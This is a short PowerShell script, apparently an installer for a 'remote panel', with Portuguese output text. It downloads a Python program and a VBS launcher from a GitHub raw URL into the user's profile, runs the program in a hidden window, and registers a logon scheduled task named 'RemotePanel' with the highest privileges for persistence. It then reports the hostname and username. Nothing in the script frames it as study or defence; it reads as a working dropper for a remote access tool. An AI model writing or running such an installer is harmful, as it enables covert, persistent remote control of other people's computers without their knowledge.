$ErrorActionPreference = "SilentlyContinue"
$folder = "$env:USERPROFILE\testemipo"

if (Test-Path "$folder\app.py") { exit }

New-Item -ItemType Directory -Path $folder -Force | Out-Null

$githubUser = "nohanvs"
$repo = "nohanpcs"
$baseUrl = "https://raw.githubusercontent.com/$githubUser/$repo/main"

Invoke-WebRequest -Uri "$baseUrl/app.py" -OutFile "$folder\app.py"
Invoke-WebRequest -Uri "$baseUrl/start.vbs" -OutFile "$folder\start.vbs"

$pyPath = "$env:LOCALAPPDATA\Python\bin\python.exe"
if (-not (Test-Path $pyPath)) { $pyPath = "python.exe" }

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "$folder"
WshShell.Run """$pyPath"" -B $folder\app.py", 0, False
"@
Set-Content -Path "$folder\start.vbs" -Value $vbsContent -Encoding ASCII

schtasks /create /tn "RemotePanel" /tr "wscript.exe `"$folder\start.vbs`"" /sc onlogon /rl highest /f | Out-Null

Start-Process -FilePath "wscript.exe" -ArgumentList "`"$folder\start.vbs`"" -WindowStyle Hidden

$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
Write-Host "Painel instalado: $hostname ($username)"
